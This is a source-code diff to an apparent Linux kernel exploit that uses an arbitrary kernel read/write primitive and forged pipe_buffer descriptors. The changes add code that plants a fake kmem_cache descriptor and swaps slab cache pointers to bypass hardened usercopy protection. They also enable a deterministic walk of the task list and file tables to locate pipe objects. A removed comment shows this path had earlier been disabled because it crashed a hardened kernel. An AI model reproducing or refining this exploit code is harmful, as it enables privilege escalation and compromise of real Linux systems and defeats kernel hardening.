@@ -83,6 +83,13 @@ void kernelsnitch_set_profile(struct kernelsnitch_shared_state *ks,
 #define OSS_STRUCT_PAGE_SIZE 0x40ULL
 #define OSS_STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08ULL
 #define OSS_STRUCT_SLAB_CACHE_OFF 0x18ULL
+#define OSS_KMEM_CACHE_DESC_SIZE 264
+#define OSS_KMEM_CACHE_SIZE_OFF 24
+#define OSS_KMEM_CACHE_OBJECT_SIZE_OFF 28
+#define OSS_KMEM_CACHE_INUSE_OFF 80
+#define OSS_KMEM_CACHE_ALIGN_OFF 84
+#define OSS_KMEM_CACHE_USEROFFSET_OFF 244
+#define OSS_KMEM_CACHE_USERSIZE_OFF 248
 
 #define OSS_KMALLOC_CACHES_OFF 0x02064478ULL
 #define OSS_ANON_PIPE_BUF_OPS_OFF 0x01e7f460ULL
@@ -92,9 +99,12 @@ void kernelsnitch_set_profile(struct kernelsnitch_shared_state *ks,
 #define OSS_TASK_PID_OFF 0x5d8ULL        /* task_struct.pid */
 #define OSS_TASK_COMM_OFF 0x7a8ULL       /* task_struct.comm[16] */
 #define OSS_TASK_FILES_OFF 0x7d8ULL      /* task_struct.files */
+#define OSS_TASK_CACHE_SIZE 4608U        /* task_struct slab slot */
 #define OSS_FILES_FDT_OFF 0x20ULL        /* files_struct.fdt */
+#define OSS_FILES_CACHE_SIZE 704U         /* files_cache slab slot */
 #define OSS_FDTABLE_FD_OFF 0x08ULL       /* fdtable.fd (file **) */
 #define OSS_FILE_PRIVATE_DATA_OFF 0xd8ULL /* file.private_data */
+#define OSS_FILE_CACHE_SIZE 320U          /* filp slab slot */
 #define OSS_PIPE_HEAD_OFF 0x60ULL        /* pipe_inode_info.head */
 #define OSS_PIPE_TAIL_OFF 0x64ULL        /* pipe_inode_info.tail */
 #define OSS_PIPE_RING_SIZE_OFF 0x6cULL   /* pipe_inode_info.ring_size */
@@ -108,6 +118,7 @@ void kernelsnitch_set_profile(struct kernelsnitch_shared_state *ks,
 #define OSS_KMALLOC_CACHE_SLOTS 56
 
 #define OSS_PROOF_OFF 0x7100ULL
+#define OSS_FAKE_KMEM_CACHE_OFF 0x7400ULL
 #define OSS_PROOF_READ_TAG "nebusec_70687973727730"
 #define OSS_PROOF_WRITE_TAG "nebusec_70687973727731"
 #define OSS_PROOF_READ 0x306365737562656eULL /* "nebusec0" */
@@ -203,6 +214,8 @@ static struct kernelsnitch_shared_state *g_ks;
 static atomic_int g_io_restore_failed;
 static struct pipe_attempt_diag g_prepare_diag;
 static atomic_int g_prepare_timeout_ms;
+static uint32_t g_fake_cache_size;
+static uint64_t g_fake_cache_addr;
 
 static uint64_t monotonic_ms(void) {
   struct timespec now;
@@ -868,6 +881,118 @@ static uint64_t page_to_direct(uint64_t page) {
          ((page - OSS_VMEMMAP_START) / OSS_STRUCT_PAGE_SIZE) * OSS_PAGE_SIZE;
 }
 
+struct slab_cache_guard {
+  uint64_t slot;
+  uint64_t original;
+  int active;
+};
+
+static void put_u32(unsigned char *buffer, size_t offset, uint32_t value) {
+  memcpy(buffer + offset, &value, sizeof(value));
+}
+
+static int write_fake_kmem_cache(int fd, uint32_t cache_size) {
+  uint64_t address = g_payload_base + OSS_FAKE_KMEM_CACHE_OFF;
+  if (g_fake_cache_addr == address && g_fake_cache_size == cache_size) {
+    return 1;
+  }
+  unsigned char descriptor[OSS_KMEM_CACHE_DESC_SIZE];
+  memset(descriptor, 0, sizeof(descriptor));
+  put_u32(descriptor, OSS_KMEM_CACHE_SIZE_OFF, cache_size);
+  put_u32(descriptor, OSS_KMEM_CACHE_OBJECT_SIZE_OFF, cache_size);
+  put_u32(descriptor, OSS_KMEM_CACHE_INUSE_OFF, cache_size);
+  put_u32(descriptor, OSS_KMEM_CACHE_ALIGN_OFF, 8);
+  put_u32(descriptor, OSS_KMEM_CACHE_USEROFFSET_OFF, 0);
+  put_u32(descriptor, OSS_KMEM_CACHE_USERSIZE_OFF, cache_size);
+  if (!oss_kernel_write(fd, address, descriptor, sizeof(descriptor))) {
+    fprintf(stderr,
+            "[pipe_rw] guard: fake-cache write failed addr=%016llx size=%u "
+            "errno=%d\n",
+            (unsigned long long)address, cache_size, errno);
+    return 0;
+  }
+  g_fake_cache_addr = address;
+  g_fake_cache_size = cache_size;
+  return 1;
+}
+
+static int slab_cache_guard_end(int fd, struct slab_cache_guard *guard) {
+  if (!guard->active) {
+    return 1;
+  }
+  int restored = oss_kernel_write64(fd, guard->slot, guard->original);
+  uint64_t readback = restored ? oss_kernel_read64(fd, guard->slot) : 0;
+  guard->active = 0;
+  if (!restored || readback != guard->original) {
+    atomic_store_explicit(&g_io_restore_failed, 1, memory_order_release);
+    return 0;
+  }
+  return 1;
+}
+
+static int slab_cache_guard_begin(int fd, uint64_t object,
+                                  uint32_t cache_size,
+                                  struct slab_cache_guard *guard) {
+  memset(guard, 0, sizeof(*guard));
+  if (!is_direct_ptr(object) || !write_fake_kmem_cache(fd, cache_size)) {
+    fprintf(stderr,
+            "[pipe_rw] guard: setup failed object=%016llx size=%u direct=%d\n",
+            (unsigned long long)object, cache_size, is_direct_ptr(object));
+    return 0;
+  }
+  uint64_t page = direct_to_page(object);
+  uint64_t compound =
+      oss_kernel_read64(fd, page + OSS_STRUCT_PAGE_COMPOUND_HEAD_OFF);
+  if (compound == UINT64_MAX) {
+    fprintf(stderr,
+            "[pipe_rw] guard: compound read failed object=%016llx "
+            "page=%016llx errno=%d\n",
+            (unsigned long long)object, (unsigned long long)page, errno);
+    return 0;
+  }
+  if (compound & 1) {
+    page = compound & ~1ULL;
+  }
+  guard->slot = page + OSS_STRUCT_SLAB_CACHE_OFF;
+  guard->original = oss_kernel_read64(fd, guard->slot);
+  if (!is_direct_ptr(guard->original)) {
+    fprintf(stderr,
+            "[pipe_rw] guard: invalid cache object=%016llx page=%016llx "
+            "compound=%016llx slot=%016llx cache=%016llx\n",
+            (unsigned long long)object, (unsigned long long)page,
+            (unsigned long long)compound, (unsigned long long)guard->slot,
+            (unsigned long long)guard->original);
+    return 0;
+  }
+  uint64_t fake = g_payload_base + OSS_FAKE_KMEM_CACHE_OFF;
+  if (!oss_kernel_write64(fd, guard->slot, fake)) {
+    int saved_errno = errno;
+    int restored = oss_kernel_write64(fd, guard->slot, guard->original);
+    uint64_t readback = restored ? oss_kernel_read64(fd, guard->slot) : 0;
+    if (!restored || readback != guard->original) {
+      atomic_store_explicit(&g_io_restore_failed, 1, memory_order_release);
+    }
+    fprintf(stderr,
+            "[pipe_rw] guard: cache swap failed slot=%016llx fake=%016llx "
+            "restore=%d errno=%d\n",
+            (unsigned long long)guard->slot, (unsigned long long)fake,
+            restored && readback == guard->original, saved_errno);
+    return 0;
+  }
+  guard->active = 1;
+  uint64_t installed = oss_kernel_read64(fd, guard->slot);
+  if (installed != fake) {
+    fprintf(stderr,
+            "[pipe_rw] guard: cache swap verify failed slot=%016llx "
+            "fake=%016llx got=%016llx\n",
+            (unsigned long long)guard->slot, (unsigned long long)fake,
+            (unsigned long long)installed);
+    slab_cache_guard_end(fd, guard);
+    return 0;
+  }
+  return 1;
+}
+
 static int collect_pipe_slabs(int fd, uint64_t slabs[OSS_PIPE_MAX_SLABS],
                               size_t *slab_count) {
   uint64_t caches[OSS_KMALLOC_CACHE_SLOTS];
@@ -1254,13 +1379,21 @@ static int pipe_rw_read_once(int fd, uint64_t addr, void *buf, size_t len) {
   forged.flags = OSS_PIPE_CAN_MERGE;
   forged.private = 0;
   if (!oss_kernel_write(fd, g_victim_addr, &forged, sizeof(forged))) {
-    fd_restore_flags(pipe_fd, saved_flags);
+    /* A short write may already have changed part of the live descriptor.
+     * Restore best-effort, but never treat this as a retryable proof miss. */
+    int restored = oss_kernel_write(fd, g_victim_addr, &saved, sizeof(saved));
+    int flags_restored = fd_restore_flags(pipe_fd, saved_flags);
+    atomic_store_explicit(&g_io_restore_failed, 1, memory_order_release);
+    fprintf(stderr,
+            "[pipe_rw] read descriptor forge failed; terminal restore=%d flags=%d\n",
+            restored, flags_restored);
     return 0;
   }
   int ok = pipe_io_bounded(pipe_fd, buf, len, 0);
   int restored = oss_kernel_write(fd, g_victim_addr, &saved, sizeof(saved));
   int flags_restored = fd_restore_flags(pipe_fd, saved_flags);
-  atomic_store_explicit(&g_io_restore_failed, !restored, memory_order_release);
+  atomic_store_explicit(&g_io_restore_failed, !restored || !flags_restored,
+                        memory_order_release);
   return ok && restored && flags_restored;
 }
 
@@ -1287,13 +1420,19 @@ static int pipe_rw_write_once(int fd, uint64_t addr, const void *buf,
   forged.flags = OSS_PIPE_CAN_MERGE;
   forged.private = 0;
   if (!oss_kernel_write(fd, g_victim_addr, &forged, sizeof(forged))) {
-    fd_restore_flags(pipe_fd, saved_flags);
+    int restored = oss_kernel_write(fd, g_victim_addr, &saved, sizeof(saved));
+    int flags_restored = fd_restore_flags(pipe_fd, saved_flags);
+    atomic_store_explicit(&g_io_restore_failed, 1, memory_order_release);
+    fprintf(stderr,
+            "[pipe_rw] write descriptor forge failed; terminal restore=%d flags=%d\n",
+            restored, flags_restored);
     return 0;
   }
   int ok = pipe_io_bounded(pipe_fd, (void *)buf, len, 1);
   int restored = oss_kernel_write(fd, g_victim_addr, &saved, sizeof(saved));
   int flags_restored = fd_restore_flags(pipe_fd, saved_flags);
-  atomic_store_explicit(&g_io_restore_failed, !restored, memory_order_release);
+  atomic_store_explicit(&g_io_restore_failed, !restored || !flags_restored,
+                        memory_order_release);
   return ok && restored && flags_restored;
 }
 
@@ -1418,69 +1557,167 @@ static int establish_pipe_rw(int fd, enum pipe_error *error) {
   return 0;
 }
 
-/* Tier 2: deterministic pipe_buffer resolution. Walks init_task.tasks to the
- * calling process, then its fd table, to one of the reclaim pipes'
- * pipe_inode_info, and reads the exact kernel address of the pipe_buffer at the
- * current tail. Replaces the KernelSnitch leak + slab scan with a pointer walk
- * over the already-live AAR primitive. Every hop is validated; any failure
- * returns 0 so the caller falls back to the KernelSnitch path. */
-static uint64_t walk_find_task(int fd, pid_t want_pid) {
+/* Walk backward because the freshly exec'd payload is normally at the tail of
+ * init_task.tasks. Before reading protected SLUB objects, temporarily point
+ * only their compound page at a synthetic cache descriptor whose usercopy
+ * region covers the complete slot. Restore and verify after every read. */
+static uint64_t walk_find_task(int fd, pid_t want_pid,
+                               enum pipe_error *error) {
   uint64_t list_head = g_kernel_base + OSS_INIT_TASK_OFF + OSS_TASK_TASKS_OFF;
   fprintf(stderr, "[pipe_rw] det: task walk head=%016llx pid=%d\n",
           (unsigned long long)list_head, want_pid);
-  uint64_t node = oss_kernel_read64(fd, list_head);
-  fprintf(stderr, "[pipe_rw] det: task walk first=%016llx\n",
+  uint64_t node = oss_kernel_read64(fd, list_head + sizeof(uint64_t));
+  fprintf(stderr, "[pipe_rw] det: task walk last=%016llx\n",
           (unsigned long long)node);
+  int walked = 0;
+  const char *stop = "limit";
   for (int i = 0; i < 16384; i++) {
     if (node == UINT64_MAX || node == 0 || node == list_head) {
+      stop = node == list_head ? "list-head" : "invalid-node";
       break;
     }
     uint64_t task = node - OSS_TASK_TASKS_OFF;
     if (!is_direct_ptr(task)) {
+      stop = "non-direct-task";
+      break;
+    }
+    struct slab_cache_guard guard;
+    if (!slab_cache_guard_begin(fd, task, OSS_TASK_CACHE_SIZE, &guard)) {
+      if (atomic_load_explicit(&g_io_restore_failed, memory_order_acquire)) {
+        *error = PIPE_E_RESTORE;
+      }
+      stop = "guard-begin";
       break;
     }
     uint32_t pid = 0;
-    if (!oss_kernel_read(fd, task + OSS_TASK_PID_OFF, &pid, sizeof(pid))) {
+    uint64_t next = 0;
+    int read_ok =
+        oss_kernel_read(fd, task + OSS_TASK_PID_OFF, &pid, sizeof(pid)) &&
+        oss_kernel_read(fd,
+                        task + OSS_TASK_TASKS_OFF + sizeof(uint64_t), &next,
+                        sizeof(next));
+    if (!slab_cache_guard_end(fd, &guard)) {
+      *error = PIPE_E_RESTORE;
+      return 0;
+    }
+    if (!read_ok) {
+      stop = "task-read";
       break;
     }
+    walked++;
+    if (walked <= 8) {
+      fprintf(stderr,
+              "[pipe_rw] det: task sample=%d task=%016llx pid=%u "
+              "next=%016llx\n",
+              walked, (unsigned long long)task, pid,
+              (unsigned long long)next);
+    }
     if ((pid_t)pid == want_pid) {
+      fprintf(stderr, "[pipe_rw] det: task found walked=%d task=%016llx\n",
+              walked, (unsigned long long)task);
       return task;
     }
-    node = oss_kernel_read64(fd, node);
+    node = next;
   }
+  fprintf(stderr,
+          "[pipe_rw] det: task walk stopped walked=%d reason=%s "
+          "node=%016llx\n",
+          walked, stop, (unsigned long long)node);
   return 0;
 }
 
-static int resolve_pipe_victim_deterministic(int fd) {
+static int read_pipe_file_table(int fd, uint64_t task,
+                                uint64_t files_out[OSS_PIPE_COUNT],
+                                enum pipe_error *error) {
+  struct slab_cache_guard task_guard;
+  if (!slab_cache_guard_begin(fd, task, OSS_TASK_CACHE_SIZE, &task_guard)) {
+    if (atomic_load_explicit(&g_io_restore_failed, memory_order_acquire)) {
+      *error = PIPE_E_RESTORE;
+    }
+    return 0;
+  }
+  uint64_t files = 0;
+  int task_read =
+      oss_kernel_read(fd, task + OSS_TASK_FILES_OFF, &files, sizeof(files));
+  if (!slab_cache_guard_end(fd, &task_guard)) {
+    *error = PIPE_E_RESTORE;
+    return 0;
+  }
+  if (!task_read || !is_direct_ptr(files)) {
+    return 0;
+  }
+
+  struct slab_cache_guard files_guard;
+  if (!slab_cache_guard_begin(fd, files, OSS_FILES_CACHE_SIZE, &files_guard)) {
+    if (atomic_load_explicit(&g_io_restore_failed, memory_order_acquire)) {
+      *error = PIPE_E_RESTORE;
+    }
+    return 0;
+  }
+  uint64_t fdt = 0;
+  uint64_t fd_array = 0;
+  int table_ok =
+      oss_kernel_read(fd, files + OSS_FILES_FDT_OFF, &fdt, sizeof(fdt)) &&
+      is_direct_ptr(fdt) &&
+      oss_kernel_read(fd, fdt + OSS_FDTABLE_FD_OFF, &fd_array,
+                      sizeof(fd_array)) &&
+      is_direct_ptr(fd_array);
+  if (table_ok) {
+    for (size_t i = 0; i < OSS_PIPE_COUNT; i++) {
+      int pipe_fd = g_reclaim_pipes[i][0];
+      if (pipe_fd < 0 ||
+          !oss_kernel_read(fd, fd_array + (uint64_t)pipe_fd * 8,
+                           &files_out[i], sizeof(files_out[i]))) {
+        table_ok = 0;
+        break;
+      }
+    }
+  }
+  if (!slab_cache_guard_end(fd, &files_guard)) {
+    *error = PIPE_E_RESTORE;
+    return 0;
+  }
+  return table_ok;
+}
+
+static int resolve_pipe_victim_deterministic(int fd,
+                                             enum pipe_error *error) {
   pid_t mypid = getpid();
-  uint64_t task = walk_find_task(fd, mypid);
+  uint64_t task = walk_find_task(fd, mypid, error);
   if (!task) {
     fprintf(stderr, "[pipe_rw] det: task pid=%d not found in task list\n", mypid);
     return 0;
   }
-  uint64_t files = oss_kernel_read64(fd, task + OSS_TASK_FILES_OFF);
-  uint64_t fdt = is_direct_ptr(files)
-                     ? oss_kernel_read64(fd, files + OSS_FILES_FDT_OFF)
-                     : 0;
-  uint64_t fd_array = is_direct_ptr(fdt)
-                          ? oss_kernel_read64(fd, fdt + OSS_FDTABLE_FD_OFF)
-                          : 0;
-  if (!is_direct_ptr(fd_array)) {
+  uint64_t pipe_files[OSS_PIPE_COUNT] = {0};
+  if (!read_pipe_file_table(fd, task, pipe_files, error)) {
     fprintf(stderr, "[pipe_rw] det: fd table walk failed task=%016llx\n",
             (unsigned long long)task);
     return 0;
   }
   uint64_t anon_ops = g_kernel_base + OSS_ANON_PIPE_BUF_OPS_OFF;
   for (size_t i = 0; i < OSS_PIPE_COUNT; i++) {
-    int pipe_rd = g_reclaim_pipes[i][0];
-    if (pipe_rd < 0) {
-      continue;
-    }
-    uint64_t file = oss_kernel_read64(fd, fd_array + (uint64_t)pipe_rd * 8);
+    uint64_t file = pipe_files[i];
     if (!is_direct_ptr(file)) {
       continue;
     }
-    uint64_t pinfo = oss_kernel_read64(fd, file + OSS_FILE_PRIVATE_DATA_OFF);
+    struct slab_cache_guard file_guard;
+    if (!slab_cache_guard_begin(fd, file, OSS_FILE_CACHE_SIZE, &file_guard)) {
+      if (atomic_load_explicit(&g_io_restore_failed, memory_order_acquire)) {
+        *error = PIPE_E_RESTORE;
+        return 0;
+      }
+      continue;
+    }
+    uint64_t pinfo = 0;
+    int file_read = oss_kernel_read(fd, file + OSS_FILE_PRIVATE_DATA_OFF,
+                                    &pinfo, sizeof(pinfo));
+    if (!slab_cache_guard_end(fd, &file_guard)) {
+      *error = PIPE_E_RESTORE;
+      return 0;
+    }
+    if (!file_read) {
+      continue;
+    }
     if (!is_direct_ptr(pinfo)) {
       continue;
     }
@@ -1559,6 +1796,8 @@ void oss_pipe_rw_reset(void) {
   g_payload_base = 0;
   g_victim_pipe = -1;
   g_installed = 0;
+  g_fake_cache_size = 0;
+  g_fake_cache_addr = 0;
   atomic_store_explicit(&g_prepare_request, 0, memory_order_release);
   atomic_store_explicit(&g_prepare_done, 0, memory_order_release);
   atomic_store_explicit(&g_prepare_ok, 0, memory_order_release);
@@ -1574,13 +1813,8 @@ int oss_pipe_rw_install(int fd, uint64_t kernel_base, uint64_t payload_base) {
   uint64_t install_started_ms = monotonic_ms();
   uint64_t install_deadline_ms = install_started_ms + OSS_PIPE_INSTALL_TIMEOUT_MS;
   int deterministic =
-      (int)pipe_env_long_clamped("PIPE_DETERMINISTIC", 0, 0, 1);
-  if (deterministic) {
-    fprintf(stderr,
-            "[pipe_rw] det disabled: task_struct read triggers hardened "
-            "usercopy panic on AFZH3; using legacy path\n");
-    deterministic = 0;
-  }
+      (int)pipe_env_long_clamped("PIPE_DETERMINISTIC", 1, 0, 1);
+  atomic_store_explicit(&g_io_restore_failed, 0, memory_order_release);
   for (int attempt = 1; attempt <= OSS_PIPE_ATTEMPTS; attempt++) {
     int remaining_ms = deadline_remaining_ms(install_deadline_ms);
     if (remaining_ms <= 0) {
@@ -1604,7 +1838,7 @@ int oss_pipe_rw_install(int fd, uint64_t kernel_base, uint64_t payload_base) {
       if (pipes_ready) {
         fprintf(stderr, "[pipe_rw] det: resolving victim\n");
       }
-      if (pipes_ready && resolve_pipe_victim_deterministic(fd) &&
+      if (pipes_ready && resolve_pipe_victim_deterministic(fd, &error) &&
           prove_pipe_rw(fd, &error)) {
         g_installed = 1;
         fprintf(stderr,
